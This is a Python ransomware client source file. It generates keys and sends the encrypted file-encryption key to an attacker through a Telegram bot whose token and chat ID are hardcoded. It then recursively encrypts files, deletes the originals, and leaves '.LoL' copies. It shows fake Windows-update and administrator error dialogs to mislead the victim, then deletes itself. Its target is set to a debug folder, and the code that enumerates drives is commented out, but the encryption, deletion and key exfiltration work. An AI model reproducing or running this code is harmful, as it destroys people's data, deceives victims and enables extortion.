import telegram, asyncio                  
from nacl.public import PrivateKey, PublicKey, Box   
import nacl, nacl.secret
from datetime import datetime             
from time import sleep               
import os, sys, ctypes, tkinter    
from tkinter import messagebox
from threading import Thread
import threading
import time
from multiprocessing import Process
from PIL import Image, ImageDraw, ImageFont
from tkinter import Label, Entry
import subprocess

fileName='./Client.py'
afterFileName='./Client_after_enc.py'

PRIVATE_KEY_RSA_FILENAME=f"KEY_FILE"
PRIVATE_KEY_RSA=0
PUBLIC_KEY_RSA=0

PRIVATE_KEY_AES_FILENAME=f"KEY_FILE2"
PRIVATE_KEY_AES=0

PUBLIC_SERVER_RSA_KEY=PublicKey(b'\xf7U\x16-\xb6[^l\xc6\xc7^\xbe\xdb\x9e\xeb\xc6p\xb8\x1ffM3Z[e\xce\xa4\x86s\x9eu9')

AES_BOX=0

BOT=telegram.Bot(token='6516628933:AAHr__4L6DnlSiBXptkMsKi8DhvPwanGrJQ')
CHAT_ID=5911780078

EncryptModule=0

MaxThread=120
ThreadPool=[]
IsAdmin=ctypes.windll.shell32.IsUserAnAdmin()

PathList=[]
PathList_DEBUG=[]

def makeRSAKey():
    global PRIVATE_KEY_RSA, PUBLIC_KEY_RSA
    if os.path.isfile(PRIVATE_KEY_RSA_FILENAME):
        with open(PRIVATE_KEY_RSA_FILENAME, 'rb') as File:
            byteCode=File.read()
        PRIVATE_KEY_RSA=PrivateKey(byteCode)
        PUBLIC_KEY_RSA=PRIVATE_KEY_RSA.public_key
    else:
        PRIVATE_KEY_RSA=PrivateKey.generate()
        PUBLIC_KEY_RSA=PRIVATE_KEY_RSA.public_key
        with open(PRIVATE_KEY_RSA_FILENAME, 'wb') as File:
            File.write(PRIVATE_KEY_RSA._private_key)

def makeAESKey():
    global PRIVATE_KEY_AES
    if os.path.isfile(PRIVATE_KEY_AES_FILENAME):
        with open(PRIVATE_KEY_AES_FILENAME, 'rb') as File:
            PRIVATE_KEY_AES=File.read()
    else:
        PRIVATE_KEY_AES=nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)
        with open(PRIVATE_KEY_AES_FILENAME, 'wb') as File:
            File.write(PRIVATE_KEY_AES)

def encryptAES():
    global AES_BOX
    AES_BOX=Box(PRIVATE_KEY_RSA, PUBLIC_SERVER_RSA_KEY)
    encrypted_aes_key=AES_BOX.encrypt(PRIVATE_KEY_AES)
    return encrypted_aes_key

async def sendTelegram(chat_id, msg):
    await BOT.send_message(chat_id, msg)
    
def sendKeyToServer(encrypted_aes_key):
    loop = asyncio.get_event_loop() 
    loop.run_until_complete(sendTelegram(CHAT_ID, "ClientRSAPublicKey: "))
    loop = asyncio.get_event_loop() 
    loop.run_until_complete(sendTelegram(CHAT_ID, str(PUBLIC_KEY_RSA))) 
    loop = asyncio.get_event_loop()
    loop.run_until_complete(sendTelegram(CHAT_ID, "EncryptedClientAESKey: "))
    loop = asyncio.get_event_loop()  
    loop.run_until_complete(sendTelegram(CHAT_ID, str(encrypted_aes_key)))

class Encryptor:
    def __init__(self, files=0, encryptModule=0):
        self._files=files
        self._encryptModule=encryptModule

    def encEach(self, path):
        with open(path, "rb") as File:
            data=File.read()
        encryptedFile=self._encryptModule.encrypt(data)
        with open(f"{path}.LoL", "wb") as File:
            File.write(encryptedFile)
        os.remove(path)

    def encryptFile(self):
        try:
            for file in self._files:
                if(os.path.isfile(file)==True):
                    if(file==sys.argv[0]):
                        return
                    if(os.path.getsize(file)>500000000):
                        th=Thread(target=self.encEach(file))
                        ThreadPool.append(th)
                        th.start()
                    else :
                        self.encEach(file)
                
        except Exception as e:
            print(f"[DEBUG] Error on EnDecrypt.encryptFile(): {e}")

def setEncryptModule():
    global EncryptModule
    EncryptModule=nacl.secret.SecretBox(PRIVATE_KEY_AES)

def listUpTargetDir():
    global PathList, PathList_DEBUG
    #PathList=[r"C:\Users\\"]
    #for letter in range(97, 123):
    #    drive=f"{chr(letter)}:\\"
    #    if (pathlib.Path(drive).exists()):
    #        PathList.append(drive)
    #PathList.remove("c:\\")
    #print(f"[DEBUG] PathList: {PathList}")
    PathList_DEBUG=["E:\\github\\-ransomware\\최지웅\\StarCraft"]

def recursiveEncrypt(basepath):
    global ThreadPool
    files=[]
    dirs=[]
    for entry in os.listdir(basepath):
        absolutePath=os.path.join(basepath, entry)
        if os.path.isfile(absolutePath):
            files.append(absolutePath)
        elif os.path.isdir(absolutePath):
            dirs.append(absolutePath)

    if (len(files)>0):
        Encryptor(files, EncryptModule).encryptFile()
    for dir in dirs:
        recursiveEncrypt(dir)

#기타 함수
def fakeAdmin():
    WINDOW=tkinter.Tk()
    WINDOW.withdraw()
    messagebox.showerror("Error", "Try to re-run as administrator")

def fakeAlert():
    WINDOW=tkinter.Tk()
    WINDOW.withdraw()
    messagebox.showerror("Windows 업데이트 작업 중...", "컴퓨터를 끄지 마십시오")
            
if __name__=='__main__':
    makeRSAKey()
    makeAESKey()
    encrypted_aes_key=encryptAES()
    sendKeyToServer(encrypted_aes_key)
    setEncryptModule()
    listUpTargetDir()
    p=Process(target=fakeAlert())
    p.start()

    if(IsAdmin==False):
        task_thread = threading.Thread(target=fakeAlert)
        for drive in PathList_DEBUG:
            start=time.time()
            recursiveEncrypt(drive)
            end=time.time()
            while (len(ThreadPool)!=0):
                th=ThreadPool.pop()
                th.join()
                
            os.system(afterFileName)
            os.remove(fileName)
            
    else:
        fakeAdmin()
